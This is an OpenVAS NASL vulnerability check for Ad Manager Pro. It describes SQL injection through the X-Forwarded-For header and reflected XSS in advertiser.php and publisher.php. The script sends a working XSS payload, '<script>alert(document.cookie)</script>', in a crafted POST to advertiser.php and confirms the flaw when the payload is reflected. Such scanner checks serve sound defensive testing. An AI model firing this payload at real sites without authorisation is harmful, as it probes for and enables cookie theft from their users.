##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ad_manager_pro_mult_vuln.nasl 5841 2017-04-03 12:46:41Z cfi $
#
# Ad Manager Pro Multiple SQL Injection And XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803019");
  script_version("$Revision: 5841 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:46:41 +0200 (Mon, 03 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-08-30 17:10:10 +0530 (Thu, 30 Aug 2012)");
  script_name("Ad Manager Pro Multiple SQL Injection And XSS Vulnerabilities");

  script_xref(name : "URL" , value : "http://secunia.com/advisories/50427");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20785");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/50427");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115877/admanagerpro-sqlxss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "insight" , value : "- Input passed via the 'X-Forwarded-For' HTTP header field is not
    properly sanitised before being used in SQL queries.
  - Inputs passed via 'username', 'password' 'image_control' and 'email'
    parameters to 'advertiser.php' and 'publisher.php' is not properly
    sanitised before being returned to the user.");
  script_tag(name : "solution" , value : "Upgrade to the latest version
  For updates refer to http://www.phpwebscripts.com/ad-manager-pro/");
  script_tag(name : "summary" , value : "This host is running Ad Manager Pro and is prone to multiple sql
  injection and cross site scripting vulnerabilities.");
  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to to manipulate SQL
  queries by injecting arbitrary SQL code or execute arbitrary HTML and
  script code in a user's browser session in context of affected website.
  Impact Level: Application");
  script_tag(name : "affected" , value : "Ad Manager Pro");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
sndReq = "";
rcvRes = "";
url = "";
host = "";
dir = "";
adReq = "";
adRes = "";

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

host = http_host_name(port:port);

## Iterate over the possible paths
foreach dir (make_list_unique("/admanagerpro", "/AdManagerPro", "/ad", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:port);

  ## Confirm the application
  if(rcvRes && rcvRes =~ "HTTP/1\.[0-9]+ 200" &&
     rcvRes =~ "Powered by .*www.phpwebscripts.com")
  {
    ## Path of Vulnerable Page
    url = dir + '/advertiser.php';

    ## Construct the POST data
    postdata = "action=password_reminded&email=1234@5555.com%22/>"+
               "<script>alert(document.cookie)</script>&B1=Remind+me";

    ## Construct the POST request
    adReq = string("POST ", url, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(postdata), "\r\n",
                   "\r\n", postdata);

    ## Send post request and Receive the response
    adRes = http_keepalive_send_recv(port:port, data:adReq);

    ## Confirm exploit worked by checking the response
    if(adRes && adRes =~ "HTTP/1\.[0-9]+ 200" &&
       "<script>alert(document.cookie)</script>" >< adRes &&
       adRes =~ "Powered by .*www.phpwebscripts.com")
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
